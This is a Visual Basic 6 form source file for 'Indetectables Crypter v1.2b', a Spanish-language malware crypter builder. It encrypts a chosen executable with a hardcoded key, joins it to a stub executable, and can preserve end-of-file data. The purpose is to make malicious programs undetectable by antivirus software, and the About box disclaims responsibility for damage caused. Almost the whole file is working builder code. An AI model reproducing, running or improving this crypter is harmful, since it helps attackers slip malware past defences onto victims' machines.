VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Indetectabless 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Indetectables Crypter  v1.2b                 [by m3m0_11]"
   ClientHeight    =   660
   ClientLeft      =   45
   ClientTop       =   360
   ClientWidth     =   3735
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   660
   ScaleWidth      =   3735
   StartUpPosition =   3  'Windows Default
   Begin VB.CheckBox Check1 
      Caption         =   "EOF"
      Height          =   255
      Left            =   3000
      TabIndex        =   4
      Top             =   360
      Width           =   735
   End
   Begin VB.CommandButton Command3 
      Caption         =   "About"
      Height          =   255
      Left            =   1080
      TabIndex        =   3
      Top             =   360
      Width           =   855
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Proteger"
      Height          =   255
      Left            =   60
      TabIndex        =   2
      Top             =   360
      Width           =   975
   End
   Begin MSComDlg.CommonDialog m 
      Left            =   60
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin MSComDlg.CommonDialog f 
      Left            =   600
      Top             =   0
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command1 
      Caption         =   "..."
      Height          =   255
      Left            =   3360
      TabIndex        =   1
      Top             =   60
      Width           =   375
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   60
      TabIndex        =   0
      Text            =   "File..."
      Top             =   60
      Width           =   3255
   End
End
Attribute VB_Name = "Indetectabless"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
With f
.Filter = "Ejecutables (*.exe) | *.exe"
.DialogTitle = "Elija un archivo a proteger.."
.ShowOpen
End With
Text1.Text = f.Filename

End Sub

Private Sub Command2_Click()
If Text1.Text = "" Then
MsgBox "Elija un archivo!", vbInformation, "Indetectables Crypter  v1.2b"
Exit Sub
End If
Open App.Path & "\STUB.exe" For Binary As #1
Dim stub As String
stub = Space(LOF(1))
Get #1, , stub
Close #1
Open f.Filename For Binary As #1
Dim fs As String
fs = Space(LOF(1) - 1)
Get #1, , fs
Close #1

If Check1.Value = 1 Then
Dim sv As String
sv = ReadEOFData(f.Filename)
End If

With m
.Filter = "Ejecutables (*.exe) | *.exe"
.DialogTitle = "Guardar archivo.."
.ShowSave
End With

Dim H As New Class1
Open m.Filename For Binary As #1
Put #1, , stub & "!!!!!!!!!!!!!!!=))"
Put #1, , H.EncryptString(fs, "VIVALAMADREDELJOSE;;EEEE") & "!!!!!!!!!!!!!!!=))"
Put #1, , "VIVALAMADREDELJOSE;;EEEE" & "!!!!!!!!!!!!!!!=))"
Close #1


If Check1.Value = 1 Then
Call WriteEOFData(m.Filename, sv)
End If

MsgBox "Archivo protegido correctamente!", vbInformation, "Indetectables Crypter  v1.2b"

End Sub

Private Sub Command3_Click()
MsgBox "Este programa ha sido creado por m3m0_11 / Web indetectables.net & JodedorSoftware.tk" & vbNewLine & "No me hago responsable de los daños que puedan causar con esta utlidad" & vbNewLine & vbNewLine & "Compilado el 27/5/09 en VB6 Stub y Cliente", vbInformation, "Indetectables Crypter v1.2b"
End Sub

Private Sub Label1_Click()
Shell "cmd.exe /c start www.indetectables.net", vbHide
End Sub

Private Sub Label2_Click()
Shell "cmd.exe /c start www.jodedorsoftware.tk", vbHide
End Sub
